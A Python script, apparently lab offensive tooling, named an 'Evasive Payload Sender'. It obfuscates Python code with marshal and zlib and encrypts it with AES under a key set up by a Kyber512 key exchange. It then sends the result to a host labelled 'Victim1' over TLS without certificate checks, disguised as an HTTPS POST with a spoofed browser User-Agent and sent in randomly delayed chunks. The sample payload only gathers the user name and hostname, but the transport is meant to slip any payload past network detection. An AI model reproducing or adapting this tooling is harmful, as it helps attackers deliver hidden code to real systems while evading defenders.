#!/usr/bin/env python3
"""
Evasive Payload Sender (PQC KEM + AES + Marshal + Zlib + TLS + HTTP Mimicry)
Runs on Sender (e.g., Kali 192.168.100.15).

Establishes AES key via PQC KEM (Kyber512), encrypts payload (marshal->zlib->AES),
wraps in TLS, adds basic HTTP headers, and sends in timed, length-prefixed chunks.
"""
import socket
import time
import random
import struct
import marshal
import zlib
import ssl
import base64
import oqs # Use oqs module
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# --- Configuration ---
TARGET_IP = "192.168.100.101"  # Victim1's IP address
TARGET_PORT = 443             # Use standard HTTPS port for mimicry
CHUNK_SIZE = 1024
MIN_DELAY = 0.2
MAX_DELAY = 1.0

# PQC KEM Configuration
PQC_KEM_ALG = "Kyber512" # Use the enabled algorithm

# --- RECEIVER'S PQC PUBLIC KEY (Base64 Encoded - Paste from generator output) ---
# Replace with the actual public key generated for the receiver
# Placeholder length (1067 chars) reflects Kyber512 public key size (800 bytes) in Base64
RECEIVER_PQC_PUBLIC_KEY_B64 = "A"*1067 # <--- UPDATE THIS PLACEHOLDER LENGTH AND CONTENT
# ------------------------------------------------------------------------------
try:
    RECEIVER_PQC_PUBLIC_KEY = base64.b64decode(RECEIVER_PQC_PUBLIC_KEY_B64)
except Exception as e:
    print(f"[!] Invalid Base64 PQC Public Key provided or decode error: {e}")
    exit(1)

# Header format for chunk length
LENGTH_HEADER_FORMAT = '!I'
LENGTH_HEADER_SIZE = struct.calcsize(LENGTH_HEADER_FORMAT)
# Header format for PQC KEM ciphertext length
KEM_CT_HEADER_FORMAT = '!I'
KEM_CT_HEADER_SIZE = struct.calcsize(KEM_CT_HEADER_FORMAT)

# --- Payload Definition ---
payload_code = """
import subprocess, os
print("="*40); print("[+] PQC+AES Payload Executed!"); print(f"User: {os.getlogin()}");
try:
    res = subprocess.run("hostname", shell=True, capture_output=True, text=True)
    print(f"Hostname: {res.stdout.strip()}");
except Exception as e: print(f"Cmd failed: {e}")
print("="*40)
"""
# --------------------

def create_payload_aes(aes_key, code_string):
    """Compiles, marshals, compresses, and AES-encrypts the payload."""
    expected_aes_key_len = 32
    if len(aes_key) != expected_aes_key_len:
        print(f"[!] Warning: AES key length ({len(aes_key)}) does not match expected length ({expected_aes_key_len}).")

    try:
        compiled_code = compile(code_string, '<string>', 'exec')
        marshaled_code = marshal.dumps(compiled_code)
        compressed_data = zlib.compress(marshaled_code, level=9)
        cipher_aes = AES.new(aes_key, AES.MODE_GCM)
        nonce_aes = cipher_aes.nonce
        ciphertext_aes, tag_aes = cipher_aes.encrypt_and_digest(compressed_data)
        return nonce_aes + tag_aes + ciphertext_aes
    except Exception as e:
        print(f"[!] Failed during payload AES encryption stage: {e}")
        return None

def send_chunked_data(sock, data):
    """Sends data in length-prefixed, timed chunks (AES payload part)."""
    total_sent = 0
    while total_sent < len(data):
        delay = random.uniform(MIN_DELAY, MAX_DELAY)
        print(f"[*] AES Chunk: Waiting {delay:.2f}s...")
        time.sleep(delay)
        chunk = data[total_sent : total_sent + CHUNK_SIZE]
        chunk_len = len(chunk)
        try:
            length_header = struct.pack(LENGTH_HEADER_FORMAT, chunk_len)
            sock.sendall(length_header)
            sock.sendall(chunk)
            total_sent += chunk_len
        except Exception as e:
            print(f"[!] Error sending AES payload chunk: {e}")
            return False
    print(f"[*] Finished sending AES payload ({total_sent} bytes) in chunks.")
    return True

def main():
    # 1. PQC Key Encapsulation (Establish AES Key)
    print(f"[*] Performing PQC KEM ({PQC_KEM_ALG}) to establish AES key using oqs...")
    try:
        # Use the oqs.KeyEncapsulation class and the user-confirmed encap_secret() method
        with oqs.KeyEncapsulation(PQC_KEM_ALG) as kem:
            # Use encap_secret() as confirmed by user for their generate_keys.py
            kem_ciphertext, shared_secret_aes_key = kem.encap_secret(RECEIVER_PQC_PUBLIC_KEY) # USE USER-CONFIRMED METHOD
            print(f"[+] PQC KEM successful. Derived {len(shared_secret_aes_key)}-byte AES key.")
            print(f"[+] KEM Ciphertext size: {len(kem_ciphertext)} bytes")

    except oqs.MechanismNotSupportedError as e:
        print(f"[!] MechanismNotSupportedError: {e}")
        print(f"[!] Ensure the algorithm '{PQC_KEM_ALG}' is supported and enabled.")
        return
    except AttributeError as e:
        print(f"[!] AttributeError: {e}")
        print(f"[!] Method 'encap_secret' not found. Check API for this oqs version.")
        return
    except Exception as e:
        print(f"[!] PQC KEM encapsulate failed: {e}")
        import traceback
        traceback.print_exc()
        return

    # 2. Create AES-encrypted payload using the derived key
    aes_encrypted_payload = create_payload_aes(shared_secret_aes_key, payload_code)
    if not aes_encrypted_payload:
        return
    print(f"[+] AES payload created ({len(aes_encrypted_payload)} bytes).")

    # 3. Establish Network Connection (Raw Socket)
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # 4. Wrap Socket with TLS (HTTPS Mimicry Layer 1)
    print(f"[*] Wrapping socket with TLS for connection to {TARGET_IP}:{TARGET_PORT}")
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        ssl_sock = context.wrap_socket(raw_sock)
        ssl_sock.connect((TARGET_IP, TARGET_PORT))
        print(f"[*] TLS connection established to {TARGET_IP}:{TARGET_PORT}")
        print(f"[*] Cipher used: {ssl_sock.cipher()}")
    except ssl.SSLError as e:
        print(f"[!] TLS Error: {e}. Check if receiver is running with TLS and certs match.")
        print("[!] Ensure target port is correct and firewall allows it.")
        raw_sock.close()
        return
    except ConnectionRefusedError:
         print(f"[!] Connection refused. Is the receiver script running on {TARGET_IP}:{TARGET_PORT}?")
         raw_sock.close()
         return
    except Exception as e:
        print(f"[!] Connection or TLS wrap failed: {e}")
        raw_sock.close()
        return

    # 5. Send Data within TLS Tunnel
    with ssl_sock:
        try:
            # Send HTTP POST Headers (HTTPS Mimicry Layer 2)
            total_payload_size = KEM_CT_HEADER_SIZE + len(kem_ciphertext) + len(aes_encrypted_payload)
            http_headers = (
                f"POST /submit HTTP/1.1\r\n"
                f"Host: {TARGET_IP}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Content-Length: {total_payload_size}\r\n"
                f"Connection: close\r\n\r\n"
            )
            print("[*] Sending minimal HTTP POST headers...")
            ssl_sock.sendall(http_headers.encode('utf-8'))

            # Send PQC KEM Ciphertext Length and Ciphertext
            print(f"[*] Sending KEM ciphertext ({len(kem_ciphertext)} bytes)...")
            kem_ct_header = struct.pack(KEM_CT_HEADER_FORMAT, len(kem_ciphertext))
            ssl_sock.sendall(kem_ct_header)
            ssl_sock.sendall(kem_ciphertext)
            print("[+] KEM ciphertext sent.")

            # Send AES Payload (chunked)
            print("[*] Sending AES encrypted payload (chunked)...")
            if send_chunked_data(ssl_sock, aes_encrypted_payload):
                print("[*] Evasive payload sent successfully over TLS.")
            else:
                print("[!] Failed to send AES payload chunks.")

        except BrokenPipeError:
             print("[!] Connection broken unexpectedly (receiver might have closed).")
        except Exception as e:
            print(f"[!] Error during sending data over TLS: {e}")
            import traceback
            traceback.print_exc()

if __name__ == '__main__':
    main()